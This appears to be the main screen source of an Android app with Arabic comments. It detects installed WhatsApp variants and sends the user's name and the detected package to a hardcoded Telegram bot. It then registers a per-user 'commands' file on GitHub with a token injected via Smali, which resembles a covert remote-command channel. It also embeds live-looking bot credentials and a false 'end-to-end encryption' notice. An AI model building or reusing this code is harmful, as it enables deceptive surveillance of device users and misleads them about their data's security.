package com.ban.ab;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    // instance fields
    private final String BOT_TOKEN = "8728882712:AAHBUsyFmocj1AwCJSVE-kPMIG7zy9WcZo4";
    private final String CHAT_ID = "1749638488";
    private final String GITHUB_TOKEN = ""; // يتم حقنه عبر Smali
    private final String GITHUB_REPO_PATH = "abdullah14120/ban";
    private final OkHttpClient client = new OkHttpClient();

    private EditText nameInput;
    private EditText packageField;
    private Button sendBtn;
    private ProgressBar loadingBar; // العنصر الجديد

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // فحص حالة التسجيل المسبق
        SharedPreferences pref = getSharedPreferences("AppPrefs", MODE_PRIVATE);
        if (pref.getInt("current_step", 0) == 1) {
            goToSecondActivity();
            return;
        }

        setContentView(R.layout.activity_main);

        // تعريف العناصر
        nameInput = findViewById(R.id.nameInput);
        packageField = findViewById(R.id.packageField);
        sendBtn = findViewById(R.id.sendBtn);
        loadingBar = findViewById(R.id.loadingBar); // ربط شريط التحميل

        // إعدادات البداية
        sendBtn.setEnabled(false);
        sendBtn.setAlpha(0.5f);
        loadingBar.setVisibility(View.GONE); // مخفي في البداية

        packageField.setText(getInstalledSupportedPackage());

        nameInput.addTextChangedListener(new TextWatcher() {
            @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
            @Override public void onTextChanged(CharSequence s, int start, int before, int count) {
                checkInputs();
            }
            @Override public void afterTextChanged(Editable s) {}
        });

        sendBtn.setOnClickListener(v -> {
            String name = nameInput.getText().toString().trim();
            String pkg = packageField.getText().toString().trim();
            sendToTelegram(name, pkg);
        });
    }

    private void checkInputs() {
        String name = nameInput.getText().toString().trim();
        String pkg = packageField.getText().toString().trim();
        boolean isValid = name.length() >= 9 && !pkg.equals("لم يتم العثور على حزمة متوافقة");
        sendBtn.setEnabled(isValid);
        sendBtn.setAlpha(isValid ? 1.0f : 0.5f);
    }

    private void sendToTelegram(String name, String pkg) {
        // إدارة الواجهة: إخفاء الزر وإظهار التحميل
        runOnUiThread(() -> {
            sendBtn.setVisibility(View.GONE);
            loadingBar.setVisibility(View.VISIBLE);
        });

        String message = "📦 طلب جديد من التطبيق\n\n👤 الاسم: " + name + "\n📱 الحزمة المكتشفة:\n" + pkg;

        RequestBody body = new FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("text", message)
                .build();

        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                .post(body)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                resetUI("فشل الاتصال بتليجرام");
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    createJsonOnGithub(name);
                } else {
                    resetUI("خطأ في السيرفر");
                }
            }
        });
    }

    private void createJsonOnGithub(String name) {
        String url = "https://api.github.com/repos/" + GITHUB_REPO_PATH + "/contents/commands/" + name + ".json";
        String content = "{\"status\": \"waiting\"}";
        String encodedContent = Base64.encodeToString(content.getBytes(), Base64.NO_WRAP);
        String jsonPayload = "{\"message\":\"auto_reg\",\"content\":\"" + encodedContent + "\"}";

        RequestBody body = RequestBody.create(jsonPayload, MediaType.parse("application/json"));
        
        Request request = new Request.Builder()
                .url(url)
                .header("Authorization", "token " + GITHUB_TOKEN)
                .put(body)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) { saveAndProceed(name); }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                saveAndProceed(name);
            }
        });
    }

    // دالة لإعادة الزر في حال الفشل
    private void resetUI(String errorMsg) {
        runOnUiThread(() -> {
            sendBtn.setVisibility(View.VISIBLE);
            loadingBar.setVisibility(View.GONE);
            Toast.makeText(MainActivity.this, errorMsg, Toast.LENGTH_SHORT).show();
        });
    }

    private void saveAndProceed(String name) {
        SharedPreferences.Editor editor = getSharedPreferences("AppPrefs", MODE_PRIVATE).edit();
        editor.putInt("current_step", 1);
        editor.putString("user_name", name);
        editor.apply();

        runOnUiThread(() -> {
            Toast.makeText(MainActivity.this, "تم إرسال الطلب بنجاح", Toast.LENGTH_SHORT).show();
            goToSecondActivity();
        });
    }

    private void goToSecondActivity() {
        startActivity(new Intent(this, SecondActivity.class));
        finish();
    }
    
private void showSecurityNotice() {
    new androidx.appcompat.app.AlertDialog.Builder(this)
        .setTitle("🔒 اتصال آمن")
        .setMessage("يتم الآن تشفير جميع البيانات المرسلة والمستقبلة عبر خوادم فريق الدعم (End-to-End Encryption).")
        .setPositiveButton("فهمت", null)
        .show();
}

    private String getInstalledSupportedPackage() {
        String[] pkgs = {"com.whatsapp", "com.universe.messenger", "com.obwhatsapp", "com.nasa", "com.android.ab"};
        for (String p : pkgs) {
            try { getPackageManager().getPackageInfo(p, 0); return p; } catch (Exception ignored) {}
        }
        return "لم يتم العثور على حزمة متوافقة";
    }
}
